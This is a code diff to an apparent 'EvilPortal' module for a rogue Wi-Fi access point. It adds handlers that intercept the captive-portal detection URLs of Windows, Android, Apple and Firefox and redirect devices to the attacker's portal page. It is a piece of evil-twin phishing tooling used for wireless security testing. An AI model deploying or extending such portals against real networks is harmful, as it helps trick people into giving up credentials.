@@ -262,6 +262,19 @@ void EvilPortal::startAP() {
 
   this->dnsServer.start(53, "*", WiFi.softAPIP());
   server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
+
+  String localIPURL = String("http://")+WiFi.softAPIP().toString();
+
+  server.on("/connecttest.txt", [](AsyncWebServerRequest *request) { request->redirect("http://logout.net"); });	// windows 11 captive portal workaround
+  server.on("/wpad.dat", [](AsyncWebServerRequest *request) { request->send(404); });
+  server.on("/generate_204", [localIPURL](AsyncWebServerRequest *request) { request->redirect(localIPURL); });		   // android captive portal redirect
+  server.on("/redirect", [localIPURL](AsyncWebServerRequest *request) { request->redirect(localIPURL); });			   // microsoft redirect
+  server.on("/hotspot-detect.html", [localIPURL](AsyncWebServerRequest *request) { request->redirect(localIPURL); });  // apple call home
+  server.on("/canonical.html", [localIPURL](AsyncWebServerRequest *request) { request->redirect(localIPURL); });	   // firefox captive portal call home
+  server.on("/success.txt", [](AsyncWebServerRequest *request) { request->send(200); });					   // firefox captive portal call home
+  server.on("/ncsi.txt", [localIPURL](AsyncWebServerRequest *request) { request->redirect(localIPURL); });			   // windows call home
+  server.on("/favicon.ico", [](AsyncWebServerRequest *request) { request->send(404); });	// webpage icon
+
   server.begin();
   #ifdef HAS_SCREEN
     this->sendToDisplay("Evil Portal READY");
